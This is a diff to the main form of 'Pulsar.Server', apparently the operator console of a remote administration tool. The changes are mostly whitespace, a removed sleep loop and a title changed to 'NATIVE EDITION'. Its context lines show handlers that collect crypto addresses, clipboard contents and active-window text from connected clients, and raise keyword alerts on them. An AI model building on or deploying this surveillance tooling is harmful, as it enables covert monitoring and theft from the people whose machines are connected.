@@ -89,8 +89,8 @@ namespace Pulsar.Server.Forms
                 this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
                 return;
             }
-        }
-
+        }        
+        
         private void RegisterMessageHandler()
         {
             MessageHandler.Register(_clientDebugLogHandler);
@@ -102,8 +102,8 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
-        }
-
+        }        
+        
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_clientDebugLogHandler);
@@ -130,8 +130,8 @@ namespace Pulsar.Server.Forms
                         int selected = lstClients.SelectedItems.Count;
                         int connected = ListenServer?.ConnectedClients?.Length ?? 0;
                         this.Text = (selected > 0)
-                            ? string.Format("Pulsar - Connected: {0} [Selected: {1}]", connected, selected)
-                            : string.Format("Pulsar - Connected: {0}", connected);
+                            ? string.Format("Pulsar NATIVE EDITION - Connected: {0} [Selected: {1}]", connected, selected)
+                            : string.Format("Pulsar NATIVE EDITION - Connected: {0}", connected);
                     }
                     finally
                     {
@@ -350,7 +350,7 @@ namespace Pulsar.Server.Forms
                 DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                 DebugLogRichBox.SelectionLength = 0;
                 DebugLogRichBox.ScrollToCaret();
-
+                
                 DebugLogRichBox.SelectionStart = originalSelectionStart;
                 DebugLogRichBox.SelectionColor = originalSelectionColor;
             }
@@ -526,9 +526,8 @@ namespace Pulsar.Server.Forms
         private void UpdateConnectedClientsCount()
         {
             if (_countUpdateRunning) return;
-
             _countUpdateRunning = true;
-
+            
             ThreadPool.QueueUserWorkItem(_ =>
             {
                 try
@@ -556,7 +555,6 @@ namespace Pulsar.Server.Forms
         private void ProcessClientConnections(object state)
         {
             const int batchSize = 10; // up to 10 clients at once
-
             var batch = new List<KeyValuePair<Client, bool>>(batchSize);
             
             while (true)
@@ -604,11 +602,6 @@ namespace Pulsar.Server.Forms
                                 break;
                         }
                     }
-                }
-
-                if (_clientConnections.Count > 0)
-                {
-                    Thread.Sleep(10);
                 }
                 
                 if (_clientConnections.Count > 0)
@@ -1071,8 +1064,8 @@ namespace Pulsar.Server.Forms
         private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
         {
             QueueStatusUpdate(client, "userStatus", userStatus.ToString());
-        }
-
+        }        
+        
         private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
         {
             QueueStatusUpdate(client, "window", newWindow);
@@ -1085,9 +1078,8 @@ namespace Pulsar.Server.Forms
             lock (_statusUpdateLock)
             {
                 if (!_pendingStatusUpdates.ContainsKey(client))
-
                     _pendingStatusUpdates[client] = new Dictionary<string, object>();
-
+                
                 _pendingStatusUpdates[client][field] = value;
 
                 if (!_statusUpdatePending)
@@ -1100,7 +1092,6 @@ namespace Pulsar.Server.Forms
 
         private void ProcessStatusUpdates()
         {
-
             Thread.Sleep(50); //small delay for batched updates.
             
             Dictionary<Client, Dictionary<string, object>> updates;
@@ -1121,9 +1112,8 @@ namespace Pulsar.Server.Forms
                     foreach (var update in updates)
                     {
                         var item = lstClients.Items.Cast<ListViewItem>()
-
                             .FirstOrDefault(lvi => lvi != null && update.Key.Equals(lvi.Tag));
-
+                        
                         if (item != null)
                         {
                             foreach (var fieldUpdate in update.Value)
@@ -1851,8 +1841,8 @@ namespace Pulsar.Server.Forms
             {
                 frm.ShowDialog();
             }
-        }
-
+        }        
+        
         public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
         {
             if (frmMain.lstNoti.InvokeRequired)
@@ -1863,7 +1853,7 @@ namespace Pulsar.Server.Forms
             ListViewItem item = new ListViewItem(client);
             item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
             item.SubItems.Add(keywords);
-
+            
             // truncate
             string displayText = windowText;
             if (windowText.Length > 100)
@@ -1871,14 +1861,14 @@ namespace Pulsar.Server.Forms
                 displayText = windowText.Substring(0, 100) + "...";
             }
             item.SubItems.Add(displayText);
-
+            
             item.ToolTipText = windowText;
-
+            
             frmMain.lstNoti.Items.Add(item);
 
             string notificationTitle = $"Keyword Triggered: {keywords}";
             string notificationText;
-
+            
             if (keywords.Contains("(Clipboard)"))
             {
                 notificationText = $"Client: {client}\nClipboard: {(windowText.Length > 50 ? windowText.Substring(0, 50) + "..." : windowText)}";
@@ -2395,4 +2385,5 @@ namespace Pulsar.Server.Forms
     }
 
     #endregion AutoTaskStuff
+
 }
